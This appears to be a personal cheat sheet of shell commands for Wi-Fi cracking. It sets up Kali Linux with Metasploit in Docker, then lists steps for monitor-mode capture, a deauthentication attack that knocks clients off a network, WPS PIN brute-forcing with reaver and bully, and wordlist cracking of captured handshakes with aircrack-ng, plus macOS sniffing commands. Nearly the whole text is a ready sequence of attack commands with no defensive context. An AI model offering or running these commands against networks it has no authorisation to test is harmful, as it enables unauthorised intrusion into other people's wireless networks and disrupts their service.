# kali
https://www.kali.org/news/official-kali-linux-docker-images/

docker pull kalilinux/kali-rolling:latest
docker run -t -i --name kali kalilinux/kali-rolling /bin/bash
apt update && apt -y install metasploit-framework

# wifi
https://blog.csdn.net/qq_34489091/article/details/80229477
https://www.cnblogs.com/diligenceday/p/6344698.html?utm_source=itdadao&utm_medium=referral
https://aquilao.github.io/Blog/Breaking_a_WPS_PIN_to_Get_the_Password_with_Bully/

sudo apt update; upgrade

sudo apt install net-tools wireless-tools aircrack-ng reaver bully

ifconfig; iwconfig

sudo airmon-ng

sudo airmon-ng start wlan0

sudo airodump-ng wlan0mon

sudo aireplay-ng -0 0 -a BSSID -c STATION wlan0mon

reaver -i wlan0mon -b BSSID -vv

reaver -i wlan0mon -b xx:xx -p ping -vv

bully mon0 -b BSSID -e ESSID -c channel

sudo airmon-ng stop wlan0mon

# MAC OS

brew install net-tools wireless-tools aircrack-ng

ifconfig; iwconfig

sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan

sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff

sudo aircrack-ng /tmp/*.cap

sudo aircrack-ng -w pwd*.txt -b BSSID /tmp/*.cap
